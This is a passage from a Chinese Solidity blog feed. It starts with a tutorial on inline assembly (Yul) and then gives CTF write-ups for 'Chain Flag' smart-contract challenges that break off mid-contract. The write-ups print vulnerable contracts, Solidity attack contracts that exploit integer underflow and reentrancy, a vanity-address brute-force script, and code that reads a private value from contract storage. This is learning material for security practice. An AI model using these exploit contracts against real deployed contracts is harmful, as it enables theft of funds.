基本语法</h3><p>solidity的汇编语言更接近 EVM，其定义了俩中汇编语言的实现方式：</p><ul><li>**内联汇编（Inline Assembly )**：可以在内部Solidity源代码中使用。：</li><li><strong>独立汇编（Standalone Assembly</strong>：可以直接使用，无需Solidity。（尚未实现）</li></ul><p>在solidity中使用<code>assembly&#123;&#125;</code>来嵌入汇编代码段，这种形式的汇编被称为内联汇编，在<code>assembly</code>块内的代码开发语言被称为Yul。</p><p>需要注意的是，汇编代码块之间是不能进行通信的，即一个汇编代码块里定义的变量在另一个汇编代码块中不能被访问。（不同的内联汇编块不共享任何名称空间，即不可能调用Yul函数或访问在其他内联汇编块中定义的Yul变量）如以下代码就会报错：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123; </span><br><span class="line">    let x := 2</span><br><span class="line">&#125;    </span><br><span class="line">assembly &#123;</span><br><span class="line">    let y := x          // Error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例：计算两数之和</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Add(uint x,uint y) public pure returns(uint) &#123;</span><br><span class="line">assembly&#123;</span><br><span class="line">    let result := add(x,y) //创建一个新的变量result 使用add操作码计算x+y,将结果赋值给result</span><br><span class="line">    mstore(0x0,result)  //从内存中保存结果</span><br><span class="line">    return(0x0,32)         //从内存地址0x0返回32字节</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  在Yul中使用<code>let</code>关键字定义变量，使用 <code>:=</code>操作符赋值给变量，如果没有使用<code>:=</code>那么会将变量的值自动初始化为0。</p><h5 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h5><p>在Solidity汇编中字面量的写法与Solidity一致。不过，字符串字面量最多可以包含32个字符。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123; </span><br><span class="line"> let a := 0x123             // 16进制</span><br><span class="line"> let b := 42                // 10进制</span><br><span class="line"> let c := &quot;hello world&quot;     // 字符串</span><br><span class="line"></span><br><span class="line"> let d := &quot;very long string more than 32 bytes&quot; // 超长字符串，出错！</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// TypeError: String literal too long (35 &lt; 32)</span><br><span class="line">// let d := &quot;really long string more than 32 bytes&quot;</span><br><span class="line">// </span><br></pre></td></tr></table></figure><h5 id="块和作用域"><a href="#块和作用域" class="headerlink" title="块和作用域"></a>块和作用域</h5><p>在Solidity汇编中，变量的作用范围遵循标准规则。一个块的范围使用由一对大括号标识。变量仅在定义所在块的范围内有效，当块执行完时，块中的变量也会被销毁。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123; </span><br><span class="line"> let x := 3          // x在各处可见</span><br><span class="line"> // Scope 1 </span><br><span class="line"> &#123; </span><br><span class="line"> let y := x     // ok </span><br><span class="line"> &#125;  // 到此处会销毁y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="变量访问"><a href="#变量访问" class="headerlink" title="变量访问"></a>变量访问</h5><p>在Solidity汇编中，只需要<strong>使用变量名</strong>就可以访问局部变量， 无论该变量是定义在汇编块中，还是汇编块之外（Solidity代码中），不过变量必须是函数的局部变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function assembly_local_var_access() public pure &#123; </span><br><span class="line"> uint b = 5; </span><br><span class="line"> </span><br><span class="line"> assembly &#123;                // defined inside  an assembly block</span><br><span class="line">     let x := add(2, 3) </span><br><span class="line">     let y := 10 </span><br><span class="line">     z := add(x, y)</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"> assembly &#123;               // defined outside an assembly block</span><br><span class="line">     let x := add(2, 3)</span><br><span class="line">     let y := mul(x, b)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="For-循环"><a href="#For-循环" class="headerlink" title="For 循环"></a>For 循环</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solitidy中的for循环</span><br><span class="line">function for_loop_solidity(uint n, uint value) public pure returns(uint) &#123;       </span><br><span class="line">    for ( uint i = 0; i &lt; n; i++ ) &#123;</span><br><span class="line">        value = 2 * value;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//汇编代码</span><br><span class="line">function for_loop_assembly(uint n, uint value) public pure returns (uint) &#123;</span><br><span class="line">     assembly &#123;</span><br><span class="line">     //初始化 let i:=0,执行条件lt(i,n),必须是函数风格表达式，迭代后续步骤add(i,1)</span><br><span class="line">       for &#123; let i := 0 &#125; lt(i, n) &#123; i := add(i, 1) &#125; &#123; </span><br><span class="line">           value := mul(2, value) </span><br><span class="line">       &#125;   </span><br><span class="line">       mstore(0x0, value)</span><br><span class="line">       return(0x0, 32)   </span><br><span class="line">   &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    let x := 34   </span><br><span class="line">    switch lt(x, 30)</span><br><span class="line">    case true &#123;</span><br><span class="line">        // do something</span><br><span class="line">    &#125;</span><br><span class="line">    case false &#123;</span><br><span class="line">        // do something els</span><br><span class="line">    &#125;</span><br><span class="line">    default &#123;</span><br><span class="line">        // 不允许</span><br><span class="line">    &#125;           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分支列表不需要大括号，但是分支的代码块需要大括号；</li><li>所有的分支条件值必须：1）具有相同的类型 2）具有不同的值；</li><li>如果分支条件已经涵盖所有可能的值，那么不允许再出现default条件。</li></ul><h5 id="汇编函数"><a href="#汇编函数" class="headerlink" title="汇编函数"></a>汇编函数</h5><p>在 Solidity内联汇编中定义底层函数，他们可以包含自己的逻辑，调用这些自定义的函数和使用内置的操作码一样。</p><p>下面的汇编函数用来分配指定长度<code>length</code>的内存，并返回内存指针<code>pos</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    function allocate(length) -&gt; pos &#123;</span><br><span class="line">        pos := mload(0x40)</span><br><span class="line">        mstore(0x40, add(pos, length))</span><br><span class="line">    &#125;</span><br><span class="line">    let free_memory_pointer := allocate(64)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编函数运行如下：</p><ol><li>从栈顶提取参数</li><li>将结果压入栈</li></ol><p>和Solidity函数不同，不需要指定汇编函数的可见性，例如<code>public</code>或<code>private</code>， 因为汇编函数仅在定义所在的汇编代码块内有效。</p><p>汇编变量遵循相同作用域规则。最新的 Solidity 文档对此给出了明确的解释：<strong>Yul 允许定义函数。它们不应与 Solidity 中的函数混淆，因为它们从来不是合约外部接口的一部分，并且独立于 Solidity 函数的命名空间。</strong></p><p>返回值用<code>-&gt;</code> 指定会返回一个值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    function my_assembly_function(param1, param2) -&gt; my_result &#123;</span><br><span class="line">        // param2 - (4 * param1)</span><br><span class="line">        my_result := sub(param2, mul(4, param1))</span><br><span class="line">    &#125;</span><br><span class="line">    let some_value = my_assembly_function(4, 9)  // 4 - (9 * 4) = 32</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不需要显式返回语句。为了返回一个值，只需在最终语句中将其分配给返回变量</p><blockquote><p>EVM 包含了 <code>return</code> 的内置操作代码。如果在汇编函数中编写了<code>return</code> 操作码，它将停止完全执行当前上下文（内部消息调用），而不仅仅是当前汇编函数。</p></blockquote><p>使用<code>leave</code> 关键字可以放置在汇编函数体的任意位置，以停止其执行流并退出它。它的工作原理与空返回语句完全相同，有一个例外：函数将返回上次复制的变量给返回变量，<font color=red><code>leave</code> 关键字只能在函数内使用</font>。</p><h3 id="0x03-高级汇编"><a href="#0x03-高级汇编" class="headerlink" title="0x03 高级汇编"></a>0x03 高级汇编</h3><p>EVM 操作码可以分为以下几类：</p><ul><li>算数和比较操作</li><li>位操作</li><li>密码学计算，目前仅包含<code>keccak256</code></li><li>环境操作码，主要指与区块链相关的全局信息，例如：<code>blockhash</code>或<code>coinbase</code></li><li>存储、内存和栈操作</li><li>交易与合约调用操作</li><li>停机操作</li><li>日志操作</li></ul><h5 id="多个赋值"><a href="#多个赋值" class="headerlink" title="多个赋值"></a>多个赋值</h5><p>如果调用一个函数反复多个值，可以将他们赋值给元组(tuple)。前面我们已经可以在汇编中创建函数，这些函数可以返回多个值。使用汇编函数可以一次分配多个值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">      function f() -&gt; a, b &#123;&#125;</span><br><span class="line">      let c, d := f()           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="栈平衡（Stack-balancing）"><a href="#栈平衡（Stack-balancing）" class="headerlink" title="栈平衡（Stack balancing）"></a>栈平衡（Stack balancing）</h5><p>在每个 <code>assembly &#123; ... &#125;</code> 块的末尾，必须平衡堆栈（除非另有要求）。 否则，编译器将生成警告。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x01-介绍&quot;&gt;&lt;a href=&quot;#0x01-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 介绍&quot;&gt;&lt;/a&gt;0x01 介绍&lt;/h3&gt;&lt;p&gt;汇编（也称为&lt;em&gt;汇编语言&lt;/em&gt;）是指可使用汇编器转换为机器代码的低级编程语言。 汇编语言与物</summary>
      
    
    
    
    
    <category term="solidity 智能合约" scheme="https://banana69.site/tags/solidity-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Chain Flag记录</title>
    <link href="https://banana69.site/2022/08/19/Chain-Flag%E8%AE%B0%E5%BD%95/"/>
    <id>https://banana69.site/2022/08/19/Chain-Flag%E8%AE%B0%E5%BD%95/</id>
    <published>2022-08-19T09:38:23.000Z</published>
    <updated>2022-09-16T15:46:07.724Z</updated>
    
    <content type="html"><![CDATA[<h3 id="integer-overflow"><a href="#integer-overflow" class="headerlink" title="integer overflow"></a>integer overflow</h3><h4 id="bet"><a href="#bet" class="headerlink" title="bet"></a>bet</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract bet &#123;</span><br><span class="line">    uint secret;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    mapping(address =&gt; uint) public isbet;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    function Bet() public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier only_owner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setsecret(uint secretrcv) only_owner &#123;</span><br><span class="line">        secret=secretrcv;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit() payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() &#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function betgame(uint secretguess)&#123;</span><br><span class="line">        require(balanceOf[msg.sender]&gt;0);</span><br><span class="line">        balanceOf[msg.sender]-=1;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">            isbet[msg.sender]=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function doublebetgame(uint secretguess) only_owner&#123;</span><br><span class="line">        require(balanceOf[msg.sender]-2&gt;0);</span><br><span class="line">        require(isbet[msg.sender]==1);</span><br><span class="line">        balanceOf[msg.sender]-=2;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析题目，当账户中的余额大于<code>100000</code>时可以得到 flag，而增加账户余额的方法有俩个，<code>betgame</code>和<code>dou blebetgame</code>函数，在执行<code>betgame</code>时要求账户中的余额大于 0且需要猜中secrt，而在<code>doublebetgame</code>中的<code>balanceOf[msg.sender]-2&gt;0</code>会造成溢出。</p><p>整个的解题流程为：</p><ol><li>先调用<code>Bet()</code>函数，成为owner;</li><li>调用<code>profit</code>或<code>deposit</code>往合约中存入 1 ether，使可以通过betgame函数中的 require；</li><li>调用 <code>serSecret</code> 函数，设置 secert；</li><li>调用<code>betgame</code>函数俩次，第一次要通过 if，使<code>isBet = 1</code>，可以通过<code>doublebetgame</code>函数的第二个require，第二次调用时不能if判断，使<code>balanceOf[msg.sender]=1</code>，可以通过<code>doublebetgame</code>函数的第一个require;</li><li>调用<code>doublebetgame</code>函数，在<code>balanceOf[msg.sender]-=2;</code>处溢出；</li><li>最后调用<code>payforflag</code>函数获取flag。</li></ol><p>攻击合约为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    address constant private addr = 0x30d0a604d8c90064a0a3ca4beeea177eff3e9bcd;</span><br><span class="line">    bet public hack;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        hack = bet(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function becomeOwner() public &#123;</span><br><span class="line">        hack.Bet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  setSecret(uint num) public &#123;</span><br><span class="line">        hack.setsecret(num);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function profit() payable public &#123;</span><br><span class="line">        hack.profit();</span><br><span class="line">    &#125;</span><br><span class="line">    /*</span><br><span class="line">    或者使用 deposit() 函数存入 1 ether</span><br><span class="line">    function deposit() payable public &#123;</span><br><span class="line">        hack.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    function firstBet(uint secret) public &#123;</span><br><span class="line">        hack.betgame(secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function secondBet(uint secret) public &#123;</span><br><span class="line">        hack.doublebetgame(secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint)&#123;</span><br><span class="line">        return hack.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getIsbet() public view returns (uint)&#123;</span><br><span class="line">        return hack.isbet(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getFlag(string email) public &#123;</span><br><span class="line">        hack.payforflag(email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //fallback 函数</span><br><span class="line">    function() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="hf"><a href="#hf" class="headerlink" title="hf"></a>hf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract hf &#123;</span><br><span class="line">    address secret;</span><br><span class="line">    uint count;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    </span><br><span class="line">    struct node &#123;</span><br><span class="line">        address nodeadress;</span><br><span class="line">        uint nodenumber;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    node public node0;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier onlySecret() &#123;</span><br><span class="line">        require(msg.sender == secret);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function hfvote() public payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function ubw() public payable&#123;</span><br><span class="line">        if (msg.value &lt; 2 ether)</span><br><span class="line">        &#123;</span><br><span class="line">            node storage n = node0;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function fate(address to,uint value) public onlySecret &#123;</span><br><span class="line">        require(balanceOf[msg.sender]-value&gt;=0);</span><br><span class="line">        balanceOf[msg.sender]-=value;</span><br><span class="line">        balanceOf[to]+=value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上一题类似在<code>fate()</code>函数处存在溢出，但是要求满足<code>require(balanceOf[msg.sender]-value&gt;=0);</code>在<code>ubw()</code>函数中，<strong>else</strong> 缺少条件，所以可以执行<code>else</code>中的代码使得<code>n.nodeadress=msg.sender;</code>，然后执行<code>balanceOf[msg.sender]-=value;</code>造成溢出。</p><p>解题步骤为：</p><ol><li>执行<code> ubw()</code>函数且<strong>msg.value &gt; 2 ether</strong>，使<code>n.nodeadress=msg.sender;</code></li><li>执行<code>fate()</code>函数，**msg.value &gt; 0 **；</li></ol><h3 id="reentrancy"><a href="#reentrancy" class="headerlink" title="reentrancy"></a>reentrancy</h3><h4 id="babybank"><a href="#babybank" class="headerlink" title="babybank"></a>babybank</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract babybank &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line">    mapping(address =&gt; uint) public level;</span><br><span class="line">    address owner;</span><br><span class="line">    uint secret;</span><br><span class="line">    </span><br><span class="line">    //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span><br><span class="line">    //Gmail is ok. 163 and qq may have some problems.</span><br><span class="line">    event sendflag(string md5ofteamtoken,string b64email); </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //pay for flag</span><br><span class="line">    function payforflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= 10000000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit sendflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 1 </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(level[msg.sender]==0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xffff==0xb1b1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 2</span><br><span class="line">    function set_secret(uint new_secret) public onlyOwner&#123;</span><br><span class="line">        secret=new_secret;</span><br><span class="line">    &#125;</span><br><span class="line">    function guess(uint guess_secret) public&#123;</span><br><span class="line">        require(guess_secret==secret);</span><br><span class="line">        require(level[msg.sender]==1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 3</span><br><span class="line">    function transfer(address to, uint amount) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(level[msg.sender]==2);</span><br><span class="line">        balance[msg.sender] = 0;</span><br><span class="line">        balance[to] = amount;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount*100000000000000)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>challenge1 中可以使账户余额加 1，但是需要满足条件，即外部账号以<code>0xb1b1</code>结尾，可以对账户进行爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ethereum <span class="keyword">import</span> utils</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate EOA with appendix 1b1b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_eoa1</span>():</span></span><br><span class="line">    priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">    addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> addr.lower().endswith(<span class="string">&quot;b1b1&quot;</span>):</span><br><span class="line">        priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">        addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Address: &#123;&#125;\nPrivate Key: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(addr, priv.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate EOA with the ability to deploy contract with appendix 1b1b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_eoa2</span>():</span></span><br><span class="line">    priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">    addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> utils.decode_addr(utils.mk_contract_address(addr, <span class="number">0</span>)).endswith(<span class="string">&quot;1b1b&quot;</span>):</span><br><span class="line">        priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">        addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Address: &#123;&#125;\nPrivate Key: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(addr, priv.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        generate_eoa1()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        generate_eoa2()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter valid argument&quot;</span>)</span><br></pre></td></tr></table></figure><p>而 secret 可以利用 web3js 在storage获取。</p><p>在<code>withdraw</code>函数中存在重入漏洞，但是要执行该函数需要满足<code>require(balance[msg.sender] &gt;= amount);</code>，在调用完<code>profit</code>和<code>guess</code>函数后的<code>balance[msg.sender]== 2</code>，可以通过<code>withdraw</code>的检查，但是由于合约中没有余额，所以需要<code>selfdestruct</code>函数强制转入俩个 ether。</p><p>攻击合约：</p><p>也可以在 <a href="https://vanity-eth.tk/">https://vanity-eth.tk/</a> 生成满足条件的账户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit&#123;</span><br><span class="line">    address babybank_addr = 0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c;</span><br><span class="line">    uint flag = 0;</span><br><span class="line">    babybank public hack;</span><br><span class="line">  </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        hack = babybank(babybank_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        hack.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function() payable public&#123;</span><br><span class="line">        if (flag == 0)&#123;</span><br><span class="line">            flag = 1;</span><br><span class="line">            hack.withdraw(2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        hack.payforflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用生成的账户调用<code>profit</code>函数，在使用 webpy 获取到 slot 2中的 secret 的值后调用<code>guess</code>函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, EthereumTesterProvider</span><br><span class="line"></span><br><span class="line">web = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://ropsten.infura.io/v3/token&#x27;</span>))</span><br><span class="line">checkConnect = web.isConnected()</span><br><span class="line">web3 = web.eth</span><br><span class="line">address = <span class="string">&quot;0xD630cb8c3bbfd38d1880b8256eE06d168EE3859c&quot;</span></span><br><span class="line">st = Web3.toHex(web3.get_storage_at(address, <span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(st)</span><br><span class="line"></span><br><span class="line">//<span class="number">0x0000000000000000000000000000000000000000000000000003fde42988fa35</span></span><br></pre></td></tr></table></figure><p>此时生成的账户中的 <code>balance[EOA] == 2</code>，然后部署攻击合约，调用 <code>transfer</code>函数，使<code>balacne[Exploit]== 2</code>，然后在调用攻击合约的 <code>withdraw</code>函数，在攻击合约第一次接收到转账时发生重入，然后利用溢出漏洞达到获取到flag的条件。</p><h3 id="storage"><a href="#storage" class="headerlink" title="storage"></a>storage</h3><h4 id="Happy-DOuble-Eleven"><a href="#Happy-DOuble-Eleven" class="headerlink" title="Happy_DOuble_Eleven"></a>Happy_DOuble_Eleven</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">interface Tmall &#123;</span><br><span class="line">    function Chop_hand(uint) view public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Happy_DOuble_Eleven &#123;</span><br><span class="line">    </span><br><span class="line">    address public owner;</span><br><span class="line">    bool public have_money;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    bool public have_chopped;</span><br><span class="line">    uint public hand;</span><br><span class="line">    </span><br><span class="line">    mapping (address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping (address =&gt; uint) public mycart;</span><br><span class="line">    mapping (address =&gt; uint) public level;</span><br><span class="line">    </span><br><span class="line">    event pikapika_SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) onlyOwner public &#123;</span><br><span class="line">        require(uint(msg.sender) &amp; 0xfff == 0x111);</span><br><span class="line">        require(level[msg.sender] == 3);</span><br><span class="line">        require(mycart[msg.sender] &gt; 10000000000000000000);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        level[msg.sender] = 0;</span><br><span class="line">        have_chopped = false;</span><br><span class="line">        have_money = false;</span><br><span class="line">        codex.length = 0;</span><br><span class="line">        emit pikapika_SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier first() &#123;</span><br><span class="line">        uint 